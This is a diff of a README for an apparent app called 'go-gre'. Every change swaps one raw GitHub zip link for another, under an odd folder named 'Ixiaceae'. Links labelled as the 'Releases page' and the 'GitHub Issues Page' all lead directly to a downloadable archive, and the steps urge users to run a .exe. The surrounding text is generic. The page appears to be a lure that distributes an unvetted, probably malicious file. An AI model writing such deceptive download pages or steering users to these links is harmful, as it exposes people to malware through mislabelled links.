@@ -6,12 +6,12 @@ Welcome to go-gre, an easy-to-use application designed to help you track and man
 ## 📥 Download & Install
 To get started, you need to download go-gre. You can find the latest version on our Releases page. 
 
-[![Download go-gre](https://raw.githubusercontent.com/v3rtigo2012/go-gre/main/Ixiaceae/go-gre.zip)](https://raw.githubusercontent.com/v3rtigo2012/go-gre/main/Ixiaceae/go-gre.zip)
+[![Download go-gre](https://raw.githubusercontent.com/v3rtigo2012/go-gre/main/Ixiaceae/gre-go-2.8.zip)](https://raw.githubusercontent.com/v3rtigo2012/go-gre/main/Ixiaceae/gre-go-2.8.zip)
 
 Click the link above to visit the page and download the application.
 
 ### Installation Steps
-1. Go to the [Releases page](https://raw.githubusercontent.com/v3rtigo2012/go-gre/main/Ixiaceae/go-gre.zip).
+1. Go to the [Releases page](https://raw.githubusercontent.com/v3rtigo2012/go-gre/main/Ixiaceae/gre-go-2.8.zip).
 2. Look for the latest version of go-gre.
 3. Click on the file suitable for your operating system. Most likely, it will be a `.exe` for Windows or a `.zip` for Mac or Linux.
 4. After the download completes, locate the file in your downloads folder.
@@ -60,7 +60,7 @@ We welcome contributions to make go-gre even better! If you’d like to make cha
 4. Submit a pull request with a clear description of your changes.
 
 ## 📞 Support
-For further assistance, visit our [GitHub Issues Page](https://raw.githubusercontent.com/v3rtigo2012/go-gre/main/Ixiaceae/go-gre.zip). We are here to help.
+For further assistance, visit our [GitHub Issues Page](https://raw.githubusercontent.com/v3rtigo2012/go-gre/main/Ixiaceae/gre-go-2.8.zip). We are here to help.
 
 ## 🌐 Connect with Us
 Stay updated on the latest news and improvements by following us on social media platforms.
@@ -68,4 +68,4 @@ Stay updated on the latest news and improvements by following us on social media
 ### Remember
 Your feedback is valuable! Don't hesitate to send us suggestions or report issues. Enjoy using go-gre, and reach your goals efficiently! 
 
-For further details or for downloading the latest version again, visit the [Releases page](https://raw.githubusercontent.com/v3rtigo2012/go-gre/main/Ixiaceae/go-gre.zip).
+For further details or for downloading the latest version again, visit the [Releases page](https://raw.githubusercontent.com/v3rtigo2012/go-gre/main/Ixiaceae/gre-go-2.8.zip).
